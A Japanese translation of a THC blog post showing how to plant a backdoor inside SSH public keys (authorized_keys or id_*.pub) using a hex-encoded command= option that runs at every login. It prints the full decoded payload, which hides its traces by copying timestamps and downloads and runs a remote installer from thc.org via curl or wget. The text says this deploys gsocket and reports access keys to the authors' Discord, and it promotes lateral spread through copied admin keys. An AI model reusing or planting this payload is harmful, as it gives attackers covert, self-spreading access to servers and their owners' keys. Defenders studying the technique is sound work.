<div style="text-align:center;">
[f:id:motikan2010:20230525105005p:plain:w600]
</div>

本記事は以下の記事の日本語訳です。  
**Infecting SSH Public Keys with backdoors**  
[https://blog.thc.org/infecting-ssh-public-keys-with-backdoors:embed:cite]

---

<div class="contents-box"><p>[:contents]</p></div>

## Infecting SSH Public Keys with backdoors

　この記事では、SSH公開鍵にバックドアを追加する方法を学びます。このバックドアは、ユーザーがログインするたびに実行されます。  

バックドアは「`~/.ssh/authorized_keys`」または「`~/.ssh/id_*.pub`」の中に、読めない長い16進文字列として隠されています。

ソースはGitHubから入手可能です。

[https://github.com/hackerschoice/ssh-key-backdoor]


### What's the purpose

1. 笑いを取るため。
2. サーバーの再起動後にバックドアを再起動させる。  
（「`crontab`」や「`~/.bashrc`」に感染させるのと同様）
3. 横方向に拡散する。管理者は、自分のSSH公開鍵を新しいサーバーにコピーすることが知られています。
そのサーバを自分のものにします。
4. クラウドデプロイメントでは、管理者の公開鍵が新しいインスタンスにコピーされることがよくありますが、今度はその中にあなたのバックドアもコピーされます。

### The nitty-gritty

　OpenSSHには、ユーザがログインに成功したときに「（Shellの代わりに）コマンドを実行する」、という隠れた機能があります。  
例としてこの機能はAWSで、rootでログインしないようにと伝えるために使われています。

<div class="md-code" style="width:100%">
```
no-port-forwarding,no-agent-forwarding,command="echo 'Please login as the user \"ubuntu\" rather than the user \"root\".';echo;sleep 10;exit 142" ssh-ed25519 AAAA...
```
</div>

### The Details

　バックドアの文字列を分解してみます。「 `no-user-rc,no-X11-forwarding`」は、詮索好きな人の目をそらすための策略です。これは省略可能です。

`command=`の文字列は、本当のマジックが起こるところです。以下は、簡略化されたバックドア文字列の短縮版です。

<div class="md-code" style="width:100%">
```
command="`###---POWERSHELL---`;eval $(echo 6563686f2048656c6c6f204261636b646f6f72|xxd -r -ps)"
```
</div>

OpenSSHは2つの引用符"... "の間にある文字列全体を実行します。

この「`###--POWERSHELL---`」も策略である。何もしないのです。

次のコマンドevalは、エンコードされた16進文字列の中に隠されているコマンドを実行します。

実際に実行されるコマンドを明らかにするために、16進文字列をデコードしてみましょう。

<div class="md-code" style="width:100%">
```
$ echo 6563686f2048656c6c6f204261636b646f6f72 | xxd -r -ps
echo Hello Backdoor
```
</div>

この単純化されたバックドアは、ログイン時に「Hello Backdoor」と表示し、その後SSH接続を終了させるだけです。  

私たちのバックドア文字列はもっと複雑で、このようにデコードされます。

<div class="md-code" style="width:100%">
```
[[ $(stat -c%Y /bin/sh) != $(stat -c%Y .ssh) ]] && {
    touch -r /bin/sh .ssh
    export KEY=""
    bash -c "$(curl -fsSL thc.org/sshx)" || bash -c "$(wget --no-verbose -O- thc.org/sshx)" || exit 0
} >/dev/null 2>/dev/null &
[[ -n $SSH_ORIGINAL_COMMAND ]] && exec $SSH_ORIGINAL_COMMAND
[[ -z $SHELL ]] && SHELL=/bin/bash
[[ -f /run/motd.dynamic ]] && cat /run/motd.dynamic
[[ -f /etc/motd ]] && cat /etc/motd
exec -a -$(basename $SHELL) $SHELL
```
</div>

　まず、バックドアがログインのたびに起動するのではなく、一度だけ起動することを確認するためにカナリアを使用します。  
 もし「`~/.ssh`」と「`/bin/sh`」の日付が同じなら、バックドアはすでにインストールされていると仮定します。それ以外の場合は、同じ日付に設定し、その後バックドアを実行します。

　この場合のバックドアは、thc.org/sshx (`http://thc.org/sshx`) から取り出したバックドアインストーラスクリプトで、メモリ内で実行されます。  
ユーザーのログインを遅くしないために、バックグラウンドプロセスとして起動します。  
インストーラースクリプトは gsocket (`http://gsocket.io/deploy`) をインストールし、成功すればアクセスキーとシステムメトリクスを私たちのdiscordチャンネルに報告します。

　その後、バックドアの文字列は、ユーザーがシェルではなくコマンドを実行したかったかどうかをチェックします。

　最後の3行は、ユーザーがシェルにログインした場合（通常の場合）です。

1. SHELL変数がまだ設定されていない場合は、設定する。
2. Linuxのmotdをシミュレートする。
3. ユーザーのシェルを実行する。

ハッキングを続ける。

---

## 参考

本記事は以下の記事の日本語訳です。  
**Infecting SSH Public Keys with backdoors**  
[https://blog.thc.org/infecting-ssh-public-keys-with-backdoors:embed:cite]
